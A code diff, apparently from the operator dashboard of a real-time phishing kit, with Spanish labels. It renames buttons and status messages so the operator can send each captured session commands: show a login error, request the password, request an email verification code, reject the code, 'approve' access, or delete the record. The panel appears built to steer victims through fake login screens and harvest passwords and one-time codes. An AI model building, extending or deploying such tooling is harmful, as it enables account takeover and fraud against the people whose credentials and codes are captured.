@@ -116,9 +116,9 @@
     wrong_login: "📤 Enviando error de login...",
     wrong_doc: "📤 Enviando error de documento...",
     wrong_pass: "📤 Enviando error de clave...",
-    wrong_token: "📤 Enviando error de código...",
+    wrong_token: "📤 Enviando error de código correo...",
     ask_pass: "📤 Enviando a pantalla de Clave...",
-    ask_token: "📤 Enviando a pantalla de Código...",
+    ask_token: "📤 Enviando a pantalla de Código Correo...",
     approve: "📤 Aprobando acceso al panel...",
   };
 
@@ -208,8 +208,8 @@
         <div class="actions-grid">
           <button class="cmd-btn btn-err-login" onclick="sendCmd('${safeId}', 'error_login', 'Contraseña incorrecta. Inténtalo de nuevo.')">❌ Error Login</button>
           <button class="cmd-btn btn-ask-pass" onclick="sendCmd('${safeId}', 'ask_pass', 'Pedir clave')">➡️ Pedir Clave</button>
-          <button class="cmd-btn btn-ask-token" onclick="sendCmd('${safeId}', 'ask_token', 'Pedir token')">📱 Pedir Token</button>
-          <button class="cmd-btn btn-err-token" onclick="sendCmd('${safeId}', 'wrong_token', 'Código de correo inválido o expirado.')">📧 Err. Código</button>
+          <button class="cmd-btn btn-ask-token" onclick="sendCmd('${safeId}', 'ask_token', 'Pedir código de correo')">📧 Código Correo</button>
+          <button class="cmd-btn btn-err-token" onclick="sendCmd('${safeId}', 'wrong_token', 'Código de correo inválido o expirado.')">❌ Error Código Correo</button>
           <button class="cmd-btn btn-approve" onclick="sendCmd('${safeId}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
           <button class="cmd-btn btn-delete" onclick="deleteSession('${safeId}')">🗑️ Borrar Registro</button>
         </div>
